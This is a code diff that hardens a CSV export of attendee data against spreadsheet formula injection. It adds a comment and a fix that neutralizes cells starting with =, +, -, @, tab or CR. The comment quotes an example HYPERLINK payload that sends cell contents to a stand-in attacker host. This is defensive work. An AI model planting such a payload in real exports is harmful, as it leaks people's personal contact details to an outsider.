@@ -5,8 +5,23 @@ import { parseCuid } from "@/lib/security/ids";
 
 export const dynamic = "force-dynamic";
 
+/**
+ * Excel/Sheets evaluate a cell as a formula when it starts with = + - @ (or a
+ * leading tab/CR), and they do it even inside a quoted field — so escaping
+ * quotes is not enough.
+ *
+ * `name` here is fully attacker-controlled: registerSchema caps length but
+ * allows any charset, and cleanText only strips control characters. Signing up
+ * as `=HYPERLINK("https://evil.tld/?d="&A1&C1,"Erro: clique")` fits in 100
+ * chars and fires the moment an admin opens the door list — exfiltrating the
+ * attendee list (names, e-mails, WhatsApp numbers) of an 18+ dating event.
+ *
+ * Prefixing with a single quote is the standard mitigation: spreadsheets read
+ * the cell as literal text.
+ */
 function csvCell(value: string): string {
-  return `"${value.replace(/"/g, '""')}"`;
+  const neutralized = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+  return `"${neutralized.replace(/"/g, '""')}"`;
 }
 
 const genderLabel: Record<string, string> = {
